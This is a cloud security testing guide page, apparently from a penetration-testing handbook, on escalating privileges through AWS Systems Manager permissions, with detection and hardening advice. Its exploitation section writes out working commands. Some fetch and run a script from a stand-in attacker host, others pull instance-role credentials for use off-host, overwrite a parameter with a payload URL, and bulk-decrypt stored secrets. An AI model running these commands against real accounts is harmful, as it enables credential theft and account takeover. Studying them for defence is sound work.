---
cstg_id: CSTG-AWS-SSM-PRIVESC
title: "AWS Ssm - Privilege Escalation"
provider: aws
service: ssm
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - ssm:SendCommand
  - ssm:StartSession
  - ssm:CreateDocument
  - ssm:UpdateDocument
  - ssm:UpdateDocumentDefaultVersion
  - ssm:CreateAssociation
  - ssm:UpdateAssociation
  - ssm:PutParameter
  - ssm:GetParameter
  - ssm:GetParameters
  - ssm:GetParametersByPath
  - ssm:DescribeInstanceInformation
  - kms:Decrypt
tools:
  - aws-cli
  - boto3
  - cloud-privesc-path-mapping-tooling
references:
  - "https://docs.aws.amazon.com/systems-manager/latest/APIReference/Welcome.html"
  - "https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/"
license: CC BY-SA 4.0
---

## Summary

AWS Systems Manager is a privilege-escalation engine because it can execute code as the most privileged local user (root on Linux, SYSTEM on Windows) on any managed node. A managed EC2 instance almost always has an attached instance profile (an IAM role). Therefore, any principal that can run commands on, or open a session to, a managed node can assume the privileges of that node's instance-profile role - frequently a far more powerful role than the calling identity. Separately, SSM Parameter Store often holds credentials that escalate access directly.

This page enumerates the SSM permissions that enable privilege escalation and the concrete path each one provides. The attacker objective is to convert a constrained identity into the privileges of an instance-profile role (or into stored credentials) and from there into broader account control.

## Prerequisites

- An assumed-breach foothold: valid AWS credentials (IAM user/role/STS session) carrying one or more of the SSM permissions below.
- At least one Online managed node when the path relies on command/session execution (confirm with [Enumeration](../02-services/aws-ssm-enum.md)).
- For paths relying on a node's role, that node must have an instance profile whose privileges exceed the caller's.
- For `SecureString` reads, `kms:Decrypt` on the encrypting key.

## Enumeration

Confirm available escalation surface before acting:

```bash
# Online nodes (each may carry a privileged instance-profile role)
aws ssm describe-instance-information --filters "Key=PingStatus,Values=Online"

# For a node, identify the attached IAM role (instance profile) to gauge the prize
aws ec2 describe-instances --instance-ids <id> \
  --query 'Reservations[].Instances[].IamInstanceProfile.Arn'

# Readable secrets that may escalate directly
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

## Misconfigurations & Findings

- **`ssm:SendCommand` / `ssm:StartSession` granted on `Resource: *`.** The caller can execute as root/SYSTEM on every managed node and inherit each node's instance-profile role.
- **Privileged instance-profile roles on broadly reachable nodes.** Nodes whose role has `AdministratorAccess`, broad `iam:*`, or `sts:AssumeRole` to powerful roles turn any command-execution permission into account takeover.
- **`ssm:PutParameter` write access where consumers read parameters as code/config.** Overwriting a parameter that a pipeline, Lambda, or instance reads can inject attacker-controlled code or credentials.
- **`ssm:CreateDocument`/`ssm:UpdateDocument` + `ssm:SendCommand`.** The caller authors a malicious document and runs it, achieving arbitrary execution under each target's role.
- **`ssm:CreateAssociation`/`ssm:UpdateAssociation`.** The caller schedules a document to run automatically against targets, executing as root/SYSTEM without ever calling `SendCommand`.
- **Decryptable `SecureString` secrets** that contain IAM access keys, role-chaining credentials, or admin passwords.

## Exploitation

### ssm:SendCommand

Run Command executes a document on a target node as root/SYSTEM. Once code runs on the instance, the instance-profile role's credentials are retrievable from the Instance Metadata Service, escalating the caller to that role.

```bash
# Execute an arbitrary shell command on a target instance (runs as root)
aws ssm send-command \
  --document-name "AWS-RunShellScript" \
  --instance-ids "i-0123456789abcdef0" \
  --parameters 'commands=["id; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'

# Retrieve the output (which can include the role name and temporary credentials)
aws ssm get-command-invocation --command-id <id> --instance-id i-0123456789abcdef0
```

A typical escalation reads the instance role's temporary credentials (IMDSv2 shown) and exfiltrates them for use off-host:

```bash
aws ssm send-command --document-name "AWS-RunShellScript" --instance-ids "i-0..." \
  --parameters 'commands=["TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\"); ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"]'
```

The returned `AccessKeyId`, `SecretAccessKey`, and `Token` are then configured locally as the new (more privileged) identity.

### ssm:StartSession

Session Manager opens an interactive shell on the target as `ssm-user`, with passwordless `sudo` to root by default. From the session, the operator reads the instance-profile credentials exactly as above, or runs `aws sts get-caller-identity` directly on the host to confirm the assumed role.

```bash
# Requires the Session Manager plugin locally
aws ssm start-session --target i-0123456789abcdef0
# Inside: sudo -i ; then query IMDS for role credentials, or use the host's aws CLI
```

`StartSession` can also forward ports, providing network pivots in addition to local code execution (see [Lateral Movement](../04-lateral-movement/aws-ssm-lateral.md)).

### ssm:CreateDocument / ssm:UpdateDocument / ssm:UpdateDocumentDefaultVersion

A caller without a usable built-in document can author one, or hijack an existing one. Updating a document's default version means any future `SendCommand`, association, or maintenance-window task referencing that document executes attacker-controlled steps as root/SYSTEM.

```bash
# Create a malicious command document
aws ssm create-document --name "Patch-Helper" --document-type "Command" \
  --content '{"schemaVersion":"2.2","mainSteps":[{"action":"aws:runShellScript","name":"x","inputs":{"runCommand":["curl -s http://attacker/c | sh"]}}]}'

# Or hijack an existing trusted document and point default at the poisoned version
aws ssm update-document --name "TrustedRunbook" --content file://malicious.json --document-version '$LATEST'
aws ssm update-document-default-version --name "TrustedRunbook" --document-version 2

# Run it
aws ssm send-command --document-name "Patch-Helper" --instance-ids "i-0..."
```

### ssm:CreateAssociation / ssm:UpdateAssociation

State Manager associations run a document against targets on a schedule (or immediately on `apply-only-at-cron-interval=false`). This achieves root/SYSTEM execution without `SendCommand`, and persists - the association re-runs, re-establishing access.

```bash
aws ssm create-association \
  --name "AWS-RunShellScript" \
  --targets "Key=InstanceIds,Values=i-0123456789abcdef0" \
  --parameters 'commands=["curl -s http://attacker/c | sh"]'
```

Because associations apply to target *criteria* (tags, instance IDs, or `*`), an association with `Key=tag:*` or all-instances scope executes across the whole managed fleet.

### ssm:PutParameter

If any consumer treats a parameter as trusted input - a Lambda reading a config value, a startup script pulling a script URL, a CI/CD pipeline reading a deployment target - overwriting that parameter injects attacker-controlled code or credentials into a more privileged context.

```bash
# Overwrite a parameter that a privileged consumer reads and executes
aws ssm put-parameter --name "/deploy/bootstrap-url" --type String \
  --value "http://attacker/payload.sh" --overwrite
```

### ssm:GetParameter / ssm:GetParameters / ssm:GetParametersByPath (+ kms:Decrypt)

Reading stored secrets escalates directly when a parameter contains IAM keys, a role's long-term credentials, or an admin password. With `kms:Decrypt` on the SSM key, `SecureString` values are recovered just as easily as plaintext.

```bash
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
# Use any recovered AWS keys: aws configure / export, then re-enumerate as the new identity
```

## Detection & Logging

- **CloudTrail** logs the escalation primitives: `SendCommand`, `StartSession`, `CreateDocument`, `UpdateDocument`, `UpdateDocumentDefaultVersion`, `CreateAssociation`, `UpdateAssociation`, `PutParameter`, and `GetParameters` (name only). Each event carries the calling principal and parameters.
- `StartSession`/`TerminateSession` and the `ssm-user` shell activity are auditable; enable Session Manager logging to S3/CloudWatch with KMS encryption to capture in-session keystrokes/commands.
- A `SendCommand` immediately followed by IMDS access and then API calls from a *new* access key (the instance role) is a high-fidelity escalation signature; correlate `SendCommand` principal with subsequent `sts:GetCallerIdentity` from the instance role.
- GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` fires when instance-role credentials are used off the instance - the canonical signal for the `SendCommand`/`StartSession` -> IMDS path.
- Alert on `UpdateDocumentDefaultVersion` and `CreateAssociation` against `*` or broad tag targets - rare in normal operations and high impact.

## Remediation & Hardening

- Scope `ssm:SendCommand` and `ssm:StartSession` to specific instances or tag conditions (`ssm:resourceTag/*`), never `Resource: *`. Use the `ssm:SessionDocumentAccessCheck` and document-level conditions to constrain what can run.
- Apply least privilege to instance-profile roles. A node's role is reachable by anyone who can run commands on it, so it must not exceed the workload's needs and must never carry `iam:*`/admin.
- Restrict `ssm:CreateDocument`, `ssm:UpdateDocument`, and `ssm:UpdateDocumentDefaultVersion` to a controlled change-management role; require approval workflows for document changes.
- Lock down `ssm:CreateAssociation`/`UpdateAssociation`; treat the ability to schedule fleet-wide execution as equivalent to admin.
- Gate `ssm:PutParameter` to specific path prefixes and never let untrusted writers control parameters that drive code execution or deployment.
- Encrypt secrets with customer-managed KMS keys and scope `kms:Decrypt` via key policy; prefer short-lived credentials over static keys in Parameter Store.
- Enforce IMDSv2 and a low hop limit on instances to make stolen role credentials harder to exfiltrate, and use SCPs to deny SSM write actions in environments where they are not needed.

## Tools

- **aws-cli** - all `send-command`, `start-session`, document, association, and parameter operations.
- **boto3 / cloud SDKs** - scripted execution and credential extraction across many nodes.
- **Cloud privesc path-mapping tooling** - enumerates the caller's permissions and computes which SSM-based escalation paths (and which target instance roles) are reachable.

## References

- AWS Systems Manager API Reference - https://docs.aws.amazon.com/systems-manager/latest/APIReference/Welcome.html
- AWS Session Manager documentation - https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html
- Rhino Security Labs - AWS privilege escalation methods and mitigation - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Hacking the Cloud - IAM privilege escalation - https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
- Hacking the Cloud - Run shell commands on EC2 - https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/
